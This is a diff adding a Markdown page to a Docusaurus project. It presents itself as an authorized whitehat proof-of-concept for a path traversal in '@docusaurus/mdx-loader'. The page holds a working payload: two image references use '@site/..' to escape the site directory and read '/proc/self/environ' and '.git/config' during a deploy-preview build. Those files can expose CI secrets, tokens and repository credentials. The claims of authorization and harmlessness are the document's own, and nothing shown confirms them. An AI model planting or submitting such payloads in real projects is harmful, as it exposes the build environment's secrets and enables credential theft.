@@ -1,0 +1,15 @@
+---
+title: Authorized Security PoC (do not merge)
+description: Non-destructive PoC for an authorized Meta whitehat report. Closed immediately.
+---
+
+# Authorized security PoC — do not merge
+
+This page is an **authorized, non-destructive** proof-of-concept for a Meta whitehat
+security report (path traversal in `@docusaurus/mdx-loader`, `@site/..` escapes `siteDir`).
+It was explicitly requested by Meta Security to demonstrate impact. No data is modified.
+The PR will be closed immediately after the deploy preview finishes building.
+
+![env](@site/../../../../../../proc/self/environ)
+
+![gitcfg](@site/../.git/config)
